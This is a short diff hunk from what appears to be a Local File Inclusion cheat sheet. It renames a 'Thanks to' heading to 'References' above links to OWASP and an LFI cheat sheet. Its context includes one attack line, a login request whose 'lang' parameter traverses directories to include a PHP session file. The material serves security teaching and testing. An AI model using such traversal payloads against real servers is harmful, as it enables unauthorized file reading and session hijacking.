@@ -339,7 +339,7 @@ Use the LFI to include the PHP session file
 login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
 ```
 
-## Thanks to
+## References
 
 * [OWASP LFI](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
 * [HighOn.coffee LFI Cheat](https://highon.coffee/blog/lfi-cheat-sheet/)
